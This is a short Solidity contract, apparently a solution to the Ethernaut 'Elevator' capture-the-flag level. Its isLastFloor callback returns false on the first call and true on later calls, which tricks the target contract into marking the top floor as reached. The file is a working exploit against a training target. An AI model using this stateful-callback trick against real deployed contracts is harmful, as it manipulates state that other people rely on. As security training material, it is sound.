// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
  function goTo(uint _floor) external;
}

contract HackElevator {
  uint256 timesCalled;
  IElevator public elevator;

  constructor(IElevator _elevator) public {
    elevator = IElevator(_elevator);
  }

  function getToLastFloor() public {
    elevator.goTo(0);
  }

  function isLastFloor(uint) external returns (bool) {
    timesCalled++;
    if (timesCalled > 1) return true;
    else return false;
  }

}
